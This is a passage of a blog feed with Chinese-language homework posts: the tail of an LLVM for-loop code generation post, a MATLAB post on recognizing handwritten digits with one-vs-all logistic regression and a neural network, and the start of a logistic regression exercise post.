class="hljs-string">&quot;LoopStart&quot;</span>, SYM_BB, BBForLA); <span class="hljs-comment">// continue</span><br>    symbol_enter(<span class="hljs-string">&quot;LoopEnd&quot;</span>, SYM_BB, BBForEnd); <span class="hljs-comment">// break</span><br>    <span class="hljs-comment">// step 1</span><br>    PreAssignList-&gt;codegen();<br>    Builder.CreateBr(BBForCond);<br>    <br>    <span class="hljs-comment">// step 2</span><br>    Builder.SetInsertPoint(BBForCond);<br>    llvm::Value * cond = Condition-&gt;codegen();<br>    Builder.CreateCondBr(cond, BBForBody, BBForEnd);<br>    <br>    <span class="hljs-comment">// step 3</span><br>    Builder.SetInsertPoint(BBForBody);<br>    ForBlock-&gt;codegen();<br>    <span class="hljs-keyword">if</span>(!Builder.GetInsertBlock()-&gt;getTerminator())<br>        Builder.CreateBr(BBForLA);<br>    <br>    <span class="hljs-comment">// step 4</span><br>    Builder.SetInsertPoint(BBForLA);<br>    LoopAssignList-&gt;codegen();<br>    Builder.CreateBr(BBForCond);<br>    Builder.SetInsertPoint(BBForEnd);<br>    <br>    scope_leave();<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h2><p>llvm ir 的 api 每个类有一个成员函数 dump() , 可以输出当前对象代表的 ir 文本..</p>]]></content>
    
    
    <categories>
      
      <category>compiler</category>
      
    </categories>
    
    
    <tags>
      
      <tag>homework</tag>
      
      <tag>llvm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Exercise:Recognize hand-written digits</title>
    <link href="/2021/02/27/Exercise-Recognize-hand-written-digits/"/>
    <url>/2021/02/27/Exercise-Recognize-hand-written-digits/</url>
    
    <content type="html"><![CDATA[<h1 id="Multi-class-Classifification-and-Neural-Networks"><a href="#Multi-class-Classifification-and-Neural-Networks" class="headerlink" title="Multi-class Classifification and Neural Networks"></a>Multi-class Classifification and Neural Networks</h1><p>这是课程的第三个编程作业，用逻辑回归和神经网络识别手写数字，非常有趣的一个作业。</p><p>由于神经网络只学习了模型，并未学习如何训练参数，故这次作业已经提前给了神经网络的参数。</p><p>训练集样本如图:</p><img src="/2021/02/27/Exercise-Recognize-hand-written-digits/image-20210227231750755.png" class="" title="image-20210227231750755"><p>每一张图都是一个手写的数字，每一张图的像素是 20 * 20 ，将每一个像素作为一个特征来训练模型。</p><h2 id="数据可视化"><a href="#数据可视化" class="headerlink" title="数据可视化"></a>数据可视化</h2><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">[h, display_array]</span> = <span class="hljs-title">displayData</span><span class="hljs-params">(X, example_width)</span></span><br><span class="hljs-comment">%DISPLAYDATA Display 2D data in a nice grid</span><br><span class="hljs-comment">%   [h, display_array] = DISPLAYDATA(X, example_width) displays 2D data</span><br><span class="hljs-comment">%   stored in X in a nice grid. It returns the figure handle h and the </span><br><span class="hljs-comment">%   displayed array if requested.</span><br><br><span class="hljs-comment">% Set example_width automatically if not passed in</span><br><span class="hljs-keyword">if</span> ~exist(<span class="hljs-string">&#x27;example_width&#x27;</span>, <span class="hljs-string">&#x27;var&#x27;</span>) || <span class="hljs-built_in">isempty</span>(example_width) <br>example_width = <span class="hljs-built_in">round</span>(<span class="hljs-built_in">sqrt</span>(<span class="hljs-built_in">size</span>(X, <span class="hljs-number">2</span>)));<br><span class="hljs-keyword">end</span><br><br><span class="hljs-comment">% Gray Image</span><br>colormap(gray);<br><br><span class="hljs-comment">% Compute rows, cols</span><br>[m n] = <span class="hljs-built_in">size</span>(X);<br>example_height = (n / example_width);<br><br><span class="hljs-comment">% Compute number of items to display</span><br>display_rows = <span class="hljs-built_in">floor</span>(<span class="hljs-built_in">sqrt</span>(m));<br>display_cols = <span class="hljs-built_in">ceil</span>(m / display_rows);<br><br><span class="hljs-comment">% Between images padding</span><br>pad = <span class="hljs-number">1</span>;<br><br><span class="hljs-comment">% Setup blank display</span><br>display_array = - <span class="hljs-built_in">ones</span>(pad + display_rows * (example_height + pad), ...<br>                       pad + display_cols * (example_width + pad));<br><br><span class="hljs-comment">% Copy each example into a patch on the display array</span><br>curr_ex = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">j</span> = <span class="hljs-number">1</span>:display_rows<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span> = <span class="hljs-number">1</span>:display_cols<br><span class="hljs-keyword">if</span> curr_ex &gt; m, <br><span class="hljs-keyword">break</span>; <br><span class="hljs-keyword">end</span><br><span class="hljs-comment">% Copy the patch</span><br><br><span class="hljs-comment">% Get the max value of the patch</span><br>max_val = <span class="hljs-built_in">max</span>(<span class="hljs-built_in">abs</span>(X(curr_ex, :)));<br>display_array(pad + (<span class="hljs-built_in">j</span> - <span class="hljs-number">1</span>) * (example_height + pad) + (<span class="hljs-number">1</span>:example_height), ...<br>              pad + (<span class="hljs-built_in">i</span> - <span class="hljs-number">1</span>) * (example_width + pad) + (<span class="hljs-number">1</span>:example_width)) = ...<br><span class="hljs-built_in">reshape</span>(X(curr_ex, :), example_height, example_width) / max_val;<br>curr_ex = curr_ex + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">if</span> curr_ex &gt; m, <br><span class="hljs-keyword">break</span>; <br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br><span class="hljs-comment">% Display Image</span><br>h = imagesc(display_array, [<span class="hljs-number">-1</span> <span class="hljs-number">1</span>]);<br><br><span class="hljs-comment">% Do not show axis</span><br>axis image off<br><br>drawnow;<br><br><span class="hljs-keyword">end</span><br><br></code></pre></td></tr></table></figure><h2 id="多元逻辑回归"><a href="#多元逻辑回归" class="headerlink" title="多元逻辑回归"></a>多元逻辑回归</h2><p>把每一图的400个像素作为400个特征，训练逻辑回归模型，由于这次特征比较多，所以逻辑回归的实现代码一定要向量化，我在上一个作业中已经实现了向量化版的逻辑回归代价函数，所以直接拿来用。</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">[J, grad]</span> = <span class="hljs-title">lrCostFunction</span><span class="hljs-params">(theta, X, y, lambda)</span></span><br><span class="hljs-comment">%LRCOSTFUNCTION Compute cost and gradient for logistic regression with </span><br><span class="hljs-comment">%regularization</span><br><span class="hljs-comment">%   J = LRCOSTFUNCTION(theta, X, y, lambda) computes the cost of using</span><br><span class="hljs-comment">%   theta as the parameter for regularized logistic regression and the</span><br><span class="hljs-comment">%   gradient of the cost w.r.t. to the parameters. </span><br><br><span class="hljs-comment">% Initialize some useful values</span><br>m = <span class="hljs-built_in">length</span>(y); <span class="hljs-comment">% number of training examples</span><br>J = <span class="hljs-number">0</span>;<br>grad = <span class="hljs-built_in">zeros</span>(<span class="hljs-built_in">size</span>(theta));<br><br>h = sigmoid(X * theta);<br>resultSet = -y .* <span class="hljs-built_in">log</span>(h) - (<span class="hljs-built_in">ones</span>(<span class="hljs-built_in">size</span>(y)) - y) .* <span class="hljs-built_in">log</span>(<span class="hljs-built_in">ones</span>(<span class="hljs-built_in">size</span>(y)) - h);<br>penaltyTerm = (lambda / (<span class="hljs-number">2</span> * m)) * sum(theta(<span class="hljs-number">2</span>:<span class="hljs-built_in">size</span>(theta)).^<span class="hljs-number">2</span>);<br>J = (<span class="hljs-number">1</span>/m) * sum(resultSet) + penaltyTerm;<br>penaltyTerm2 = ((lambda / m) .* theta) .* [ <span class="hljs-number">0</span>; <span class="hljs-built_in">ones</span>([<span class="hljs-built_in">size</span>(theta, <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>, <span class="hljs-number">1</span>])];<br>grad = (<span class="hljs-number">1</span>/m) .* (X&#x27; * (h - y)) + penaltyTerm2;<br><span class="hljs-comment">% =============================================================</span><br>grad = grad(:);<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><h3 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h3><p>数字识别，一共有十个分类，分别对应 1,2,3,….,9,0，依次训练每一个数字的分类器。oneVsAll 函数返回所有分类器对应的参数矩阵。</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">[all_theta]</span> = <span class="hljs-title">oneVsAll</span><span class="hljs-params">(X, y, num_labels, lambda)</span></span><br><span class="hljs-comment">%ONEVSALL trains multiple logistic regression classifiers and returns all</span><br><span class="hljs-comment">%the classifiers in a matrix all_theta, where the i-th row of all_theta </span><br><span class="hljs-comment">%corresponds to the classifier for label i</span><br><span class="hljs-comment">%   [all_theta] = ONEVSALL(X, y, num_labels, lambda) trains num_labels</span><br><span class="hljs-comment">%   logistic regression classifiers and returns each of these classifiers</span><br><span class="hljs-comment">%   in a matrix all_theta, where the i-th row of all_theta corresponds </span><br><span class="hljs-comment">%   to the classifier for label i</span><br><br><span class="hljs-comment">% Some useful variables</span><br>m = <span class="hljs-built_in">size</span>(X, <span class="hljs-number">1</span>);<br>n = <span class="hljs-built_in">size</span>(X, <span class="hljs-number">2</span>);<br><br><span class="hljs-comment">% You need to return the following variables correctly </span><br>all_theta = <span class="hljs-built_in">zeros</span>(num_labels, n + <span class="hljs-number">1</span>);<br><br><span class="hljs-comment">% Add ones to the X data matrix</span><br>X = [<span class="hljs-built_in">ones</span>(m, <span class="hljs-number">1</span>) X];<br><br><span class="hljs-comment">% ====================== YOUR CODE HERE ======================</span><br>options = optimset(<span class="hljs-string">&#x27;GradObj&#x27;</span>, <span class="hljs-string">&#x27;on&#x27;</span>, <span class="hljs-string">&#x27;MaxIter&#x27;</span>, <span class="hljs-number">200</span>);<br>initial_theta = <span class="hljs-built_in">zeros</span>(n + <span class="hljs-number">1</span>, <span class="hljs-number">1</span>);<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span> = <span class="hljs-number">1</span>:<span class="hljs-number">10</span> <span class="hljs-comment">% 依次训练每一个分类器，y == i 只有 y 与 i 对应位置相等则为1否则0</span><br>    [theta] =  fmincg(@(t)(lrCostFunction(t, X, (y == <span class="hljs-built_in">i</span>), lambda)), ...<br>        initial_theta, options);<br>    all_theta(<span class="hljs-built_in">i</span>, :) = theta&#x27;;<br><span class="hljs-keyword">end</span><br><span class="hljs-comment">% =========================================================================</span><br><br><span class="hljs-keyword">end</span><br><br></code></pre></td></tr></table></figure><h3 id="预测"><a href="#预测" class="headerlink" title="预测"></a>预测</h3><p>predictOneVsAll 中的参数 X 是一个矩阵，每一行代表一张图片。每一张图片应该经过所有分类器测试，返回概率最大的分类。</p><p>向量化计算可以一次性将 X 的所有样例都计算</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">p</span> = <span class="hljs-title">predictOneVsAll</span><span class="hljs-params">(all_theta, X)</span></span><br><span class="hljs-comment">%PREDICT Predict the label for a trained one-vs-all classifier. The labels </span><br><span class="hljs-comment">%are in the range 1..K, where K = size(all_theta, 1). </span><br><span class="hljs-comment">%  p = PREDICTONEVSALL(all_theta, X) will return a vector of predictions</span><br><span class="hljs-comment">%  for each example in the matrix X. Note that X contains the examples in</span><br><span class="hljs-comment">%  rows. all_theta is a matrix where the i-th row is a trained logistic</span><br><span class="hljs-comment">%  regression theta vector for the i-th class. You should set p to a vector</span><br><span class="hljs-comment">%  of values from 1..K (e.g., p = [1; 3; 1; 2] predicts classes 1, 3, 1, 2</span><br><span class="hljs-comment">%  for 4 examples) </span><br><br>m = <span class="hljs-built_in">size</span>(X, <span class="hljs-number">1</span>);<br>num_labels = <span class="hljs-built_in">size</span>(all_theta, <span class="hljs-number">1</span>);<br><br><span class="hljs-comment">% You need to return the following variables correctly </span><br>p = <span class="hljs-built_in">zeros</span>(<span class="hljs-built_in">size</span>(X, <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br><br><span class="hljs-comment">% Add ones to the X data matrix</span><br>X = [<span class="hljs-built_in">ones</span>(m, <span class="hljs-number">1</span>) X];<br><span class="hljs-comment">% ====================== YOUR CODE HERE ======================     </span><br>test = sigmoid(X * all_theta&#x27;); <span class="hljs-comment">% 向量化计算每一个样例</span><br>[m, p] = <span class="hljs-built_in">max</span>(test, [], <span class="hljs-number">2</span>); <span class="hljs-comment">% p 是最大概率对应的下标</span><br><span class="hljs-comment">% =========================================================================</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>预测准确度如下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Training</span> Set Accuracy: <span class="hljs-number">96</span>.<span class="hljs-number">460000</span><br></code></pre></td></tr></table></figure><h2 id="神经网络预测函数"><a href="#神经网络预测函数" class="headerlink" title="神经网络预测函数"></a>神经网络预测函数</h2><p>使用神经网络也可以完成手写识别。这个作业需要使用3层神经网络, 并且已经给了参数，只要求写出 predict 函数，所以直接套公式即可计算。</p><img src="/2021/02/27/Exercise-Recognize-hand-written-digits/image-20210227234051776.png" class="" title="image-20210227234051776"><p>实现代码如下：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">p</span> = <span class="hljs-title">predict</span><span class="hljs-params">(Theta1, Theta2, X)</span></span><br><span class="hljs-comment">%PREDICT Predict the label of an input given a trained neural network</span><br><span class="hljs-comment">%   p = PREDICT(Theta1, Theta2, X) outputs the predicted label of X given the</span><br><span class="hljs-comment">%   trained weights of a neural network (Theta1, Theta2)</span><br><br><span class="hljs-comment">% Useful values</span><br>m = <span class="hljs-built_in">size</span>(X, <span class="hljs-number">1</span>);<br>num_labels = <span class="hljs-built_in">size</span>(Theta2, <span class="hljs-number">1</span>);<br><br>p = <span class="hljs-built_in">zeros</span>(<span class="hljs-built_in">size</span>(X, <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br><br><br>X = [<span class="hljs-built_in">ones</span>(<span class="hljs-built_in">size</span>(X, <span class="hljs-number">1</span>), <span class="hljs-number">1</span>), X];<span class="hljs-comment">% append bias to X</span><br>a2 = sigmoid(Theta1 * X&#x27;);<br>a2 = [<span class="hljs-built_in">ones</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">size</span>(X, <span class="hljs-number">1</span>)); a2];<span class="hljs-comment">% append bias to a2</span><br>a3 = sigmoid(Theta2 * a2);<br>[t, result] = <span class="hljs-built_in">max</span>(a3, [], <span class="hljs-number">1</span>);<br>p = result&#x27;;<br><span class="hljs-comment">% =========================================================================</span><br><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>第一层和第二层都会添加 <code>bias unit</code> 目前还不清楚有什么用。下次的作业应该涉及到如何训练神经网络的参数，期待。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://www.ai-start.com/ml2014/html/week4.html">http://www.ai-start.com/ml2014/html/week4.html</a></p><p><a href="https://s3.amazonaws.com/spark-public/ml/exercises/on-demand/machine-learning-ex3.zip">https://s3.amazonaws.com/spark-public/ml/exercises/on-demand/machine-learning-ex3.zip</a></p>]]></content>
    
    
    <categories>
      
      <category>ml</category>
      
    </categories>
    
    
    <tags>
      
      <tag>homework</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Exercise:Logistic Regression</title>
    <link href="/2021/02/23/Exercise-Logistic-Regression/"/>
    <url>/2021/02/23/Exercise-Logistic-Regression/</url>
    
    <content type="html"><![CDATA[<h1 id="Exercise-Logistic-Regression"><a href="#Exercise-Logistic-Regression" class="headerlink" title="Exercise:Logistic Regression"></a>Exercise:Logistic Regression</h1><p>记录一下逻辑回归作业代码</p><h2 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h2><p> 假设函数: $h_\theta(x)=sigmoid(\theta^Tx)$</p><p>代价函数: $J(\theta)=\frac{1}{m}\sum\limits_{i=1}^{m}[-y^{(i)}log(h_\theta(x^{(i)}))-(1-y^{(i)})log(1-h_\theta(x^{(i)}))]$</p><p>梯度(代价函数的偏导数): $\frac{\delta J(\theta)}{\delta \theta_j}=\frac{1}{m}\sum\limits_{i=1}^{m}(h_\theta(x^{(i)})-y^{(i)})x^{(i)}$</p><p>Matlab 实现 costFunction 如下（已经实现向量化计算）：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">[J, grad]</span> = <span class="hljs-title">costFunction</span><span class="hljs-params">(theta, X, y)</span></span><br><span class="hljs-comment">%COSTFUNCTION Compute cost and gradient for logistic regression</span><br><span class="hljs-comment">%   J = COSTFUNCTION(theta, X, y) computes the cost of using theta as the</span><br><span class="hljs-comment">%   parameter for logistic regression and the gradient of the cost</span><br><span class="hljs-comment">%   w.r.t. to the parameters.</span><br><span class="hljs-comment">% Initialize some useful values</span><br>m = <span class="hljs-built_in">length</span>(y); <span class="hljs-comment">% number of training examples</span><br><span class="hljs-comment">% You need to return the following variables correctly </span><br><span class="hljs-comment">% ====================== YOUR CODE HERE ======================</span><br><span class="hljs-comment">% Instructions: Compute the cost of a particular choice of theta.</span><br><span class="hljs-comment">%               You should set J to the cost.</span><br><span class="hljs-comment">%               Compute the partial derivatives and set grad to the partial</span><br><span class="hljs-comment">%               derivatives of the cost w.r.t. each parameter in theta</span><br><span class="hljs-comment">%</span><br><span class="hljs-comment">% Note: grad should have the same dimensions as theta</span><br><span class="hljs-comment">%</span><br>h = sigmoid(X * theta);<br>resultSet = -y .* <span class="hljs-built_in">log</span>(h) - (<span class="hljs-built_in">ones</span>(<span class="hljs-built_in">size</span>(y)) - y) .* <span class="hljs-built_in">log</span>(<span class="hljs-built_in">ones</span>(<span class="hljs-built_in">size</span>(y)) - h);<br>J = (<span class="hljs-number">1</span>/m) * sum(resultSet);<br>grad = (<span class="hljs-number">1</span>/m) .* (X&#x27; * (h - y));<br><span class="hljs-comment">% =============================================================</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>costFunction 有两个返回值，分别是 <code>J</code> 和 <code>grad</code>，grad 是梯度。</p><p>使用 fminunc 寻找最优解（前一个是手动写的迭代），fminunc 是 Matlab 的内置函数，它会选择合适的算法去寻找最优解，且不需要指定学习率。</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-comment">%  Set options for fminunc</span><br>options = optimset(<span class="hljs-string">&#x27;GradObj&#x27;</span>, <span class="hljs-string">&#x27;on&#x27;</span>, <span class="hljs-string">&#x27;MaxIter&#x27;</span>, <span class="hljs-number">400</span>);<br><span class="hljs-comment">%  Run fminunc to obtain the optimal theta</span><br><span class="hljs-comment">%  This function will return theta and the cost </span><br>[theta, cost] = ...<br>fminunc(@(t)(costFunction(t, X, y)), initial_theta, options);<br><br></code></pre></td></tr></table></figure><p><code>GradObj</code> 设置为 <code>on</code> 表示传入的函数会返回 [J, grad]，就是代价和梯度；<code>MaxIter</code> 指定最大迭代次数。具体参考 help fminunc</p><p>最后画出决策边界如下</p><img src="/2021/02/23/Exercise-Logistic-Regression/image-20210223200757400.png" class="" title="image-20210223200757400"><h2 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h2><p>这个任务主要是处理过拟合问题</p><img src="/2021/02/23/Exercise-Logistic-Regression/image-20210223200943694.png" class="" title="image-20210223200943694"><p>如上图，我们不能用一条直线作为决策边界，需要一条曲线。因此，引入高次项来更好的拟合这些数据。作业已经将两个特征映射到两个特征1到6次所有多项式，即一个28维的向量。</p><img src="/2021/02/23/Exercise-Logistic-Regression/image-20210223205330561.png" class="" title="image-20210223205330561"><p>如果直接用 Task1 的算法会导致过拟合问题，如图</p><img src="/2021/02/23/Exercise-Logistic-Regression/image-20210223205448860.png" class="" title="image-20210223205448860"><p>改进代价函数公式如下（正则化处理）</p><img src="/2021/02/23/Exercise-Logistic-Regression/image-20210223205553275.png" class="" title="image-20210223205553275"><img src="/2021/02/23/Exercise-Logistic-Regression/image-20210223205738337.png" class="" title="image-20210223205738337"><p>Matlab 重新实现代价函数</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">[J, grad]</span> = <span class="hljs-title">costFunctionReg</span><span class="hljs-params">(theta, X, y, lambda)</span></span><br><span class="hljs-comment">%COSTFUNCTIONREG Compute cost and gradient for logistic regression with regularization</span><br><span class="hljs-comment">%   J = COSTFUNCTIONREG(theta, X, y, lambda) computes the cost of using</span><br><span class="hljs-comment">%   theta as the parameter for regularized logistic regression and the</span><br><span class="hljs-comment">%   gradient of the cost w.r.t. to the parameters. </span><br><br><span class="hljs-comment">% Initialize some useful values</span><br>m = <span class="hljs-built_in">length</span>(y); <span class="hljs-comment">% number of training examples</span><br><br><span class="hljs-comment">% You need to return the following variables correctly </span><br>J = <span class="hljs-number">0</span>;<br>grad = <span class="hljs-built_in">zeros</span>(<span class="hljs-built_in">size</span>(theta));<br><br><span class="hljs-comment">% ====================== YOUR CODE HERE ======================</span><br><span class="hljs-comment">% Instructions: Compute the cost of a particular choice of theta.</span><br><span class="hljs-comment">%               You should set J to the cost.</span><br><span class="hljs-comment">%               Compute the partial derivatives and set grad to the partial</span><br><span class="hljs-comment">%               derivatives of the cost w.r.t. each parameter in theta</span><br><br>h = sigmoid(X * theta);<br>resultSet = -y .* <span class="hljs-built_in">log</span>(h) - (<span class="hljs-built_in">ones</span>(<span class="hljs-built_in">size</span>(y)) - y) .* <span class="hljs-built_in">log</span>(<span class="hljs-built_in">ones</span>(<span class="hljs-built_in">size</span>(y)) - h);<br>penaltyTerm = (lambda / (<span class="hljs-number">2</span> * m)) * sum(theta(<span class="hljs-number">2</span>:<span class="hljs-built_in">size</span>(theta)).^<span class="hljs-number">2</span>);<br>J = (<span class="hljs-number">1</span>/m) * sum(resultSet) + penaltyTerm;<br>penaltyTerm2 = ((lambda / m) .* theta) .* [ <span class="hljs-number">0</span>; <span class="hljs-built_in">ones</span>([<span class="hljs-built_in">size</span>(theta, <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>, <span class="hljs-number">1</span>])];<br>grad = (<span class="hljs-number">1</span>/m) .* (X&#x27; * (h - y)) + penaltyTerm2;<br><br><span class="hljs-comment">% =============================================================</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><img src="/2021/02/23/Exercise-Logistic-Regression/image-20210223205951267.png" class="" title="image-20210223205951267"><p>调整 lambda 可以获得不同的决策边界。</p><p>特征映射的代码如下(作业给的)</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">out</span> = <span class="hljs-title">mapFeature</span><span class="hljs-params">(X1, X2)</span></span><br><span class="hljs-comment">% MAPFEATURE Feature mapping function to polynomial features</span><br><span class="hljs-comment">%</span><br><span class="hljs-comment">%   MAPFEATURE(X1, X2) maps the two input features</span><br><span class="hljs-comment">%   to quadratic features used in the regularization exercise.</span><br><span class="hljs-comment">%</span><br><span class="hljs-comment">%   Returns a new feature array with more features, comprising of </span><br><span class="hljs-comment">%   X1, X2, X1.^2, X2.^2, X1*X2, X1*X2.^2, etc..</span><br><span class="hljs-comment">%</span><br><span class="hljs-comment">%   Inputs X1, X2 must be the same size</span><br><span class="hljs-comment">%</span><br><br>degree = <span class="hljs-number">6</span>;<br>out = <span class="hljs-built_in">ones</span>(<span class="hljs-built_in">size</span>(X1(:,<span class="hljs-number">1</span>)));<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span> = <span class="hljs-number">1</span>:degree<br>    <span class="hljs-keyword">for</span> <span class="hljs-built_in">j</span> = <span class="hljs-number">0</span>:<span class="hljs-built_in">i</span><br>        out(:, <span class="hljs-keyword">end</span>+<span class="hljs-number">1</span>) = (X1.^(<span class="hljs-built_in">i</span>-<span class="hljs-built_in">j</span>)).*(X2.^<span class="hljs-built_in">j</span>);<br>    <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br><span 